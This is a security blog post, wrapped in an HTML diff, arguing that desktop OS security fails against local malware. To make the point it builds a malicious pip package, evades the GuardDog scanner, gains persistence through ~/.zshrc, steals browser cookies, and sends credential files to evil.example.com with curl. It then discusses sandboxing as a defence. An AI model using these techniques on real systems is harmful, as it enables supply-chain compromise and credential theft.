@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+        <meta name="description" content="Mac Chaffee&#x27;s tech blog">
+        
+
+        <title>Mac Chaffee</title>
+
+        
+
+<meta name="image" content="https://www.macchaffee.com/static/favicon.png">
+<meta property="og:image" content="https://www.macchaffee.com/static/favicon.png">
+<meta name="theme-color" content="#ECEBF3">
+<link rel="shortcut icon" href="/static/favicon.png" type="image/png">
+
+<meta property="og:title" content="Hacking myself to prove a point">
+
+<meta property="og:description" content="Mac Chaffee&#x27;s tech blog">
+
+<link rel="stylesheet" href="/blog/theme.css">
+<style>
+body {
+    font: 400 18px/1.6 "Helvetica Neue", Helvetica, Arial, sans-serif;
+    color: #dbe0ea;
+}
+h1 {
+    font-size: 47px;
+}
+ul {
+    list-style-type: disc;
+}
+code {
+    font-family: monospace;
+    font-size: 18px;
+}
+.search-box {
+    background-color: #101a20;
+    border: 2px solid #36596c;
+    font-size: 20px;
+    line-height: 2;
+    color: #c0c5ce;
+    margin-top: 10px;
+}
+/* Overrides */
+p {
+  text-align: left;
+}
+p > code {
+  font-weight: normal;
+  padding: 1px 5px;
+  color: #a7adba;
+  background-color: #101a20;
+}
+h2 {
+    font-size: 24px;
+    border-bottom:1px solid #99c794;
+}
+blockquote {
+    color: #a7adba;
+    font-style: italic;
+}
+</style>
+
+        
+    </head>
+    <body>
+        <div class="content">
+        
+        
+            <header>
+                <div class="header-left">
+                    <a href="&#x2F;blog" class="logo">Mac Chaffee</a>
+                </div>
+                <div class="header-right">
+                    <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+                        
+                        
+                            
+                            <li class="nav">
+                                <a itemprop="url" href="/blog/2023/">
+                                    <span itemprop="name">2023</span>
+                                </a>
+                            </li>
+                        
+                            
+                            <li class="nav">
+                                <a itemprop="url" href="/blog/2022/">
+                                    <span itemprop="name">2022</span>
+                                </a>
+                            </li>
+                        
+                            
+                            <li class="nav">
+                                <a itemprop="url" href="/blog/2021/">
+                                    <span itemprop="name">2021</span>
+                                </a>
+                            </li>
+                        
+                            
+                            <li class="nav">
+                                <a itemprop="url" href="/blog/2020/">
+                                    <span itemprop="name">2020</span>
+                                </a>
+                            </li>
+                        
+                        
+                        <li class="nav">
+                            <a itemprop="url" href="https://github.com/mac-chaffee">
+                                <img class="icon" src="&#x2F;blog/icons/github.svg" alt="Github">
+                            </a>
+                        </li>
+                        
+                        
+                    </nav>
+                </div>
+            </header>
+        
+        
+        <main>
+            
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <div itemprop="headline">
+        <h1>Hacking myself to prove a point</h1>
+        <div class="border"></div>
+        <time datetime="2023-01-21" class="date" itemprop="datePublished">
+            21 Jan 2023
+        </time>
+    </div>
+    <div itemprop="articleBody">
+        <p>If you didn't hear, <a href="https://circleci.com/blog/jan-4-2023-incident-report/">CircleCI recently released their report on a December 2022 security incident</a>. What stood out to me is that CircleCI seems to be doing all the &quot;normal&quot; security things: SSO with 2FA, endpoint protection, auditing/logging, encryption at rest, etc. But they still got breached. I think this speaks to the travesty that is the modern-day security industry. It's a thousand times easier to sell some pithy software tool that checks a compliance box than it is to sell a real security transformation.</p>
+<p>I'd like to illustrate how the sorry state of desktop OS security means that pretty much every security control that is recommended to C-suites these days is a minor obstacle to a dedicated attacker. To do this, I'll try to hack myself like I'm that poor CircleCI engineer whose laptop was used as the first step in the attack.</p>
+<blockquote>
+<p>NOTE: I'm not actually targeting my setup at my current or past employers. I'm targeting a theoretical engineer that doesn't exist, but is similar to an average software engineer. My examples will use macOS but this applies to Windows and Linux just as easily.</p>
+</blockquote>
+<h2 id="step-1-get-onto-a-developer-s-laptop">Step 1: Get onto a developer's laptop</h2>
+<p>Prior to the rise of various kinds of server-side sandboxing (containers, jails, WASM, micro VMs), remote code execution was always game-over for a server. Nowadays, you might have remote code execution inside one of dozens on microservices, but with good egress restrictions and mTLS, that might be the end of your exploit chain.</p>
+<p>However for some tragic reason, the tooling for sandboxing on desktop operating systems is stuck in the dark ages. If I can just execute code on a developer's laptop, I can steal SSH keys, steal cookies, and even hijack VPN sessions. And executing code on a developer's laptop is very easy these days.</p>
+<p>To start, I'll make a malicious Python package that will execute arbitrary code when installed.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>mkdir hack
+</span><span>cd hack/
+</span><span>vim setup.py
+</span></code></pre>
+<p><code>setup.py:</code></p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>setuptools
+</span><span style="color:#b48ead;">from </span><span>setuptools.command.install </span><span style="color:#b48ead;">import </span><span>install
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">Install</span><span style="color:#eff1f5;">(</span><span style="color:#a3be8c;">install</span><span style="color:#eff1f5;">):
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">run</span><span>(</span><span style="color:#bf616a;">self</span><span>):
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">************************ pwned ************************</span><span>&quot;)
+</span><span>        install.</span><span style="color:#bf616a;">run</span><span>(</span><span style="color:#bf616a;">self</span><span>)
+</span><span>
+</span><span>setuptools.</span><span style="color:#bf616a;">setup</span><span>(
+</span><span>    </span><span style="color:#bf616a;">name</span><span>=&quot;</span><span style="color:#a3be8c;">malicious</span><span>&quot;,
+</span><span>    </span><span style="color:#bf616a;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0.0</span><span>&quot;,
+</span><span>    </span><span style="color:#bf616a;">install_requires</span><span>=[],
+</span><span>    </span><span style="color:#bf616a;">cmdclass</span><span>={&#39;</span><span style="color:#a3be8c;">install</span><span>&#39;: Install}
+</span><span>)
+</span></code></pre>
+<p>Now we install the package, with extra verbosity just to see our &quot;pwned&quot; print statement:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ pip install -v .
+</span><span>Using pip 22.3.1 from /hack/venv/lib/python3.10/site-packages/pip (python 3.10)
+</span><span>Processing /hack
+</span><span>...
+</span><span>  running bdist_wheel
+</span><span>  running build
+</span><span>  installing to build/bdist.macosx-12.3-x86_64/wheel
+</span><span>  running install
+</span><span>  ************************ pwned ************************
+</span><span>  running install_egg_info
+</span><span>  running egg_info
+</span><span>...
+</span><span>Successfully installed malicious-1.0.0
+</span></code></pre>
+<p>Alright! Now we just need our target developer to install this package. This is the only hard part about our hack, but we have a lot of options:</p>
+<ul>
+<li><a href="https://snyk.io/blog/malicious-packages-found-to-be-typo-squatting-in-pypi/">Typo-squatting a popular package</a></li>
+<li><a href="https://sockpuppets.medium.com/how-i-hacked-ctx-and-phpass-modules-656638c6ec5e">Registering someone's expired domain</a> that they used to use for email, then issuing password resets</li>
+<li><a href="https://www.theregister.com/2023/01/04/pypi_pytorch_dependency_attack/">Tricking a popular package</a> to include your package as a dependency</li>
+<li>Paying to own a popular package</li>
+<li>Forking an abandoned project and telling everyone to migrate to yours</li>
+<li>Good ol' fashioned phishing</li>
+<li>and more</li>
+</ul>
+<h3 id="avoiding-detection">Avoiding detection</h3>
+<p>With our malicious package, it would be easy to exfiltrate files, but some nosy person will probably notice a <code>subprocess.run(['curl', 'evil.example.com'...])</code> line on our file. DataDog publishes a tool that will simulate our nosy person, who we can trivially trick.</p>
+<p>Our current script does get noticed:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ guarddog scan ./dist/malicious-1.0.0.tar.gz
+</span><span>Found 1 potentially malicious indicators in ./dist/malicious-1.0.0.tar.gz
+</span><span>
+</span><span>cmd-overwrite: found 1 source code matches
+</span><span>  * Standard pip command overwritten in setup.py at malicious-1.0.0/setup.py:12
+</span><span>        setuptools.setup(
+</span><span>        name=&quot;malicious&quot;,
+</span><span>        version=&quot;1.0.0&quot;,
+</span><span>        install_requires=[],
+</span><span>        cmdclass={&#39;install&#39;: Install}
+</span><span>    )
+</span></code></pre>
+<p>But that's an easy fix. If we just assign the <code>{'install': Install}</code> dictionary to a variable (<a href="https://github.com/pytorch/pytorch/blob/eadbf762fc36f23ef78b084973dc39a13605db46/setup.py#L1199">like pytorch does</a>), we avoid detection:</p>
+<p><code>setup.py:</code></p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#d08770;">...
+</span><span>cmdclass = {&#39;</span><span style="color:#a3be8c;">install</span><span>&#39;: Install}
+</span><span>
+</span><span>setuptools.</span><span style="color:#bf616a;">setup</span><span>(
+</span><span>    </span><span style="color:#bf616a;">name</span><span>=&quot;</span><span style="color:#a3be8c;">malicious</span><span>&quot;,
+</span><span>    </span><span style="color:#bf616a;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0.0</span><span>&quot;,
+</span><span>    </span><span style="color:#bf616a;">install_requires</span><span>=[],
+</span><span>    </span><span style="color:#bf616a;">cmdclass</span><span>=cmdclass
+</span><span>)
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ guarddog scan ./dist/malicious-1.0.0.tar.gz
+</span><span>Found 0 potentially malicious indicators scanning ./dist/malicious-1.0.0.tar.gz
+</span></code></pre>
+<p>Now let's try executing some more useful code than just a print statement, such as running a shell command:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">run</span><span>(</span><span style="color:#bf616a;">self</span><span>):
+</span><span>    subprocess.</span><span style="color:#bf616a;">run</span><span>([&#39;</span><span style="color:#a3be8c;">whoami</span><span>&#39;])
+</span></code></pre>
+<p>Uh oh, we've been caught:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ guarddog scan ./dist/malicious-1.0.0.tar.gz
+</span><span>Found 1 potentially malicious indicators in ./dist/malicious-1.0.0.tar.gz
+</span><span>
+</span><span>code-execution: found 1 source code matches
+</span><span>  * setup.py file executing code at malicious-1.0.0/setup.py:8
+</span><span>        subprocess.run([&#39;whoami&#39;])
+</span></code></pre>
+<p>But we can bypass that easily as well. The thing about automated scanners is that they always have to balance false positives, which makes them fall apart when faced with a dedicated attacker. GuardDog can detect &quot;common obfuscation methods&quot;, but I guess not <code>getattr()</code>. The following code obtains the function <code>subprocess.run()</code> via the string <code>run</code> instead of using the dotted syntax, then executes it like normal:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">run</span><span>(</span><span style="color:#bf616a;">self</span><span>):
+</span><span>    </span><span style="color:#96b5b4;">getattr</span><span>(subprocess, &#39;</span><span style="color:#a3be8c;">run</span><span>&#39;)([&#39;</span><span style="color:#a3be8c;">whoami</span><span>&#39;])
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ guarddog scan ./dist/malicious-1.0.0.tar.gz
+</span><span>Found 0 potentially malicious indicators scanning ./dist/malicious-1.0.0.tar.gz
+</span></code></pre>
+<p>Great! Now we have the ability to execute arbitrary code (including subprocesses) on a developer's laptop.</p>
+<h3 id="aside-won-t-someone-notice-this-malicious-code-on-github">Aside: Won't someone notice this malicious code on GitHub?</h3>
+<p>It shocks me that people seem to blindly trust that the code you see in an open-source repo will match the version that you end up executing. I do wish GitHub offered some way of cryptographically attesting that fact, but I can simply change the code locally before publishing to pypi. The real source code will be in the <code>.tar.gz</code> file uploaded to pypi, but do you really check that file for every package you download? Didn't think so. Maybe if you had a tool like guarddog to do that, but as you can see that's easily circumventable.</p>
+<h3 id="aside-my-antivirus-will-catch-your-setup-py-file">Aside: My antivirus will catch your setup.py file!</h3>
+<p>Let's fix that, shall we?</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>uuid
+</span><span>
+</span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(__file__, &quot;</span><span style="color:#a3be8c;">a</span><span>&quot;) </span><span style="color:#b48ead;">as </span><span>f:
+</span><span>    f.</span><span style="color:#bf616a;">write</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;"># </span><span>{</span><span style="color:#bf616a;">str</span><span>(uuid.</span><span style="color:#bf616a;">uuid4</span><span>())}&quot;)
+</span></code></pre>
+<p>Now whenever setup.py executes, it will add a random string as a comment to the end of the file. This makes the <code>sha256sum</code> of the file differ for every user. Your only hope now is if your antivirus manages to quarantine the file in the few milliseconds between when <code>pip</code> downloads it and when it gets executed, which is unlikely.</p>
+<h2 id="step-2-getting-persistence">Step 2: Getting persistence</h2>
+<p>Since our end goal is bypassing SSO, we need to be able to execute our arbitrary code while the developer is logged in, which can be as small as a few minutes for really sensitive stuff. Just hoping setup.py executes during that window isn't likely, but we can gain persistence trivially.</p>
+<p>GuardDog will notice if we create a file and mark it executable, and many OSes make running new daemons a privileged operation. So a good compromise would be to append our malicious code to an existing script that the user regularly executes (and rarely reads) while they're logged into production. There are lots of options here, but I think <code>~/.zshrc</code> (or equivalent) is a good one. That executes every time someone spawns a new terminal on macOS. The last time I touched the file was 2 months ago, so that's a lot of time to stay undetected.</p>
+<p>Let's now gain persistence, which I am just now realizing doesn't even require <code>subprocess</code>, we can just write to the file directly:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">run</span><span>(</span><span style="color:#bf616a;">self</span><span>):
+</span><span>    </span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{os.environ[&#39;</span><span style="color:#a3be8c;">HOME</span><span>&#39;]}</span><span style="color:#a3be8c;">/.zshrc</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">a</span><span>&quot;) </span><span style="color:#b48ead;">as </span><span>f:
+</span><span>        f.</span><span style="color:#bf616a;">write</span><span>(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">curl http://evil.example.com &gt; /dev/null 2&gt;&amp;1 | bash || true</span><span>&quot;)
+</span><span>    install.</span><span style="color:#bf616a;">run</span><span>(</span><span style="color:#bf616a;">self</span><span>)
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ guarddog scan ./dist/malicious-1.0.0.tar.gz
+</span><span>Found 0 potentially malicious indicators scanning ./dist/malicious-1.0.0.tar.gz
+</span></code></pre>
+<p>Great! Now we have the ability to execute arbitrary code frequently, with a high likelihood that our code will execute while the victim is logged in.</p>
+<h2 id="step-3-pivoting-to-prod">Step 3: Pivoting to prod</h2>
+<p>The world is now our oyster. Without some kind of sandboxing in place, we can access the vast majority of important files on the file system, including SSH keys, <code>~/.kube/config</code>, cloud credentials, and browser cookies. It just depends on what we decide to put into that <code>f.write()</code> call.</p>
+<p>Here's an example of stealing a cookie:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ cd ~/Library/Application\ Support/Firefox/Profiles/
+</span><span># There may be multiple profiles, just pick the first one
+</span><span>$ cd $(ls | head -n 1)
+</span><span>
+</span><span># Database will probably be locked if the browser is open, so just copy it
+</span><span>$ cp cookies.sqlite unlocked-cookies.sqlite
+</span><span>$ sqlite3 cookies.sqlite
+</span><span>sqlite&gt; SELECT name,value FROM moz_cookies WHERE host=&quot;news.ycombinator.com&quot;;
+</span><span>user|mac-chaffee&amp;PCeezf4hhaH5S7BRsTtX/hVUQ3SQb9IpFU
+</span><span>
+</span><span># Now to peek at an auth-protected page using that cookie:
+</span><span>curl -i -SsLH &#39;Cookie: user=mac-chaffee&amp;PCeezf4hhaH5S7BRsTtX/hVUQ3SQb9IpFU&#39; &#39;https://news.ycombinator.com/upvoted?id=mac-chaffee&#39;
+</span></code></pre>
+<p>I was surprised to see FireFox does nothing to protect cookies on disk, even if you sign into FireFox Sync. At least Chrome encrypts them using macOS Keychain, but <a href="https://mango.pdf.zone/stealing-chrome-cookies-without-a-password">you can bypass that too</a>. Surely Safari is properly using macOS security features to protect cookies, right? Wrong. You can apparently <a href="https://lapcatsoftware.com/articles/disclosure2.html">modify Safari with malicious code without invalidating its code signature</a>. It's telling that <a href="https://attack.mitre.org/techniques/T1539/">MITRE's page on cookie theft</a> has no real solution to this problem either.</p>
+<p>Here's an example of stealing my cloudflare credentials:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>curl --data-binary=@~/Library/Preferences/.wrangler/config/default.toml http://evil.example.com
+</span></code></pre>
+<p>Or my Kubernetes credentials:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>curl --data-binary=@~/.kube/config http://evil.example.com
+</span></code></pre>
+<p>Or my gcloud credentials:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>curl --data-binary=@~/.config/gcloud/credentials.db http://evil.example.com
+</span></code></pre>
+<p>Not even 2FA will save me here. Even if some of those sites are VPN-protected or they tie the credentials to a specific source IP, that's not an issue for an attacker. They can just execute the API calls directly from my computer through the VPN.</p>
+<h3 id="aside-my-outbound-firewall-littlesnitch-et-al-will-catch-you">Aside: My outbound firewall (LittleSnitch et. al.) will catch you!</h3>
+<p>That's only true if I exfiltrate the credentials or if I try to download a &quot;stage 2&quot; payload instead of directly including my exploit code in setup.py. I bet you already have a rule allowing your terminal application to access your cloud accounts anyway.</p>
+<p>I considered editing the LittleSnitch config files manually, but to their credit, the config files are owned by root (thus requiring a password to read/edit). Even the new CLI won't let you do anything unless you are root.</p>
+<p>Another way attackers can circumvent something like LittleSnitch is to proxy the traffic through a host you have already allowed, like maybe I use your company's internal HTTP proxy, or maybe I upload your credentials to an S3 bucket (you allow s3.amazonaws.com, right?). I can perform recon on your computer to determine what kinds of precautions I can/should take.</p>
+<h2 id="potential-solutions">Potential Solutions</h2>
+<p>I think a true solution to this kind of hack would be: proper sandboxing for desktop operating systems with a user experience that isn't built by masochists (looking at you SELinux).</p>
+<p><a href="https://support.apple.com/en-my/guide/mac-help/mchl244f2895/10.14/mac/10.14">MacOS Mojave added a feature</a> which blocks access to certain folders, but frustratingly limited the feature to folders like Documents, Pictures, etc., not <code>~/.kube/config</code> for instance. Wouldn't stop this attack, but it's a step in the right direction.</p>
+<p>MacOS has also started requiring Mac App Store apps to use the &quot;<a href="https://developer.apple.com/documentation/security/app_sandbox">app sandbox</a>&quot;, which is kinda the same thing but also includes camera, microphone, etc. Again, wouldn't stop the attack I described above.</p>
+<p>MacOS does have a CLI utility which allows you to execute commands inside of an &quot;app sandbox&quot;. Apple has deprecated the CLI and definitely doesn't want you to use it, but with a <a href="https://github.com/lynaghk/sandboxtron">wrapper script called &quot;sb&quot;</a> and some custom policies, it can be manageable:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ sb -- pip install .
+</span><span>...
+</span><span>  × python setup.py bdist_wheel did not run successfully.
+</span><span>  │ exit code: 1
+</span><span>  ╰─&gt; [7 lines of output]
+</span><span>      running bdist_wheel
+</span><span>      running build
+</span><span>        warnings.warn(
+</span><span>      installing to build/bdist.macosx-12.3-x86_64/wheel
+</span><span>      running install
+</span><span>      error: [Errno 1] Operation not permitted: &#39;/Users/machaffe/.zshrc&#39;
+</span><span>      [end of output]
+</span><span>...
+</span></code></pre>
+<p><a href="https://nixos.wiki/wiki/Nix_package_manager#Sandboxing">Nix has a feature</a> where package builds are executed inside a restricted sandbox. If you installed my pypi package via Nix, sounds like you'd be totally safe. Well, assuming you enabled that feature, which is not enabled by default on macOS.</p>
+<p>There are <a href="https://github.com/stepchowfun/toast">tools</a> that make it easier to develop entirely in containers, but it can be very challenging to get your editor/IDE to play nice with these. There will also be places where you'll have to relax the security boundary, like allowing access to SSH keys to run an ansible playbook. Or using a SaaS API key to process some data in a Jupyter notebook.</p>
+<p>I met a Googler who said everyone they know uses some internal version of <a href="https://cloud.google.com/blog/products/application-development/introducing-cloud-shell-editor">Google Cloud Shell Editor</a>, a cloud based IDE. I don't think this solves the problem since you are essentially working in a VM where you <code>pip install</code> stuff into the same VM that has access to deploy stuff to Google Cloud:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>mac@cloudshell:~$ gcloud projects list
+</span><span>&lt;prompt pops up to authorize gcloud, which is granted for the entire session&gt;
+</span><span>mac@cloudshell:~$ pip install -v .
+</span><span>Using pip 20.3.4 from /usr/lib/python3/dist-packages/pip (python 3.9)
+</span><span>...
+</span><span>  running install
+</span><span>  ************************ pwned ************************
+</span><span>...
+</span></code></pre>
+<p>I think all these tools are approaching the problem from the wrong direction. Why lock-down every app on my computer or change my whole workflow just to protect a few security-sensitive files? One feature I'd like is for applications like <code>gcloud</code> or <code>kubectl</code> to easily tell the operating system &quot;I'm going to create a file called <code>credentials.txt</code>, and only I should have access to it&quot;. The macOS Keychain is supposed to be that, but it's not difficult to <a href="https://wojciechregula.blog/post/stealing-macos-apps-keychain-entries/">bypass the Keychain ACLs</a>, even for signed binaries.</p>
+<p>Another approach would be heavily restricting access to production. You can't avoid accessing prod entirely due to emergencies, but I can forsee a solution that's safe-ish from local malware. You'd need some kind of auditing jump box like <a href="https://www.cyberark.com/products/privileged-access-manager/">CyberArk</a> or <a href="https://goteleport.com/">Teleport</a> with hardware 2FA and super short sessions. You'd only use this for emergencies, so you should probably enable that &quot;email/IM my entire team if someone accesses prod&quot; feature too. But to be truly safe from local malware, you'd still want ways to stop session hijacking, key logging, and screen grabbing. Not sure if the tech is there to do this perfectly, so you're still stuck with trying to fend off local malware with crappy tools.</p>
+<h2 id="conclusions">Conclusions</h2>
+<p>Local malware <em>sucks</em>. It's too easy to get infected and too easy for attackers to avoid detection, even though local malware has basically been around about as long as computers have existed. I'm disappointed in the software security industry for spending decades chasing flashy, profitable products instead of actually improving security. You know what? I'm starting to suspect this whole idea of a society dedicated to extracting profit from people above all else is not such a good idea...</p>
+
+    </div>
+</article>
+
+        </main>
+        
+        <footer>
+            
+    <div class="border"></div>
+    <div class="footer">
+        
+        <div>
+            <a href="/">Home</a>
+        </div>
+    </div>
+
+        </footer>
+    
+        </div>
+    </body>
+</html>
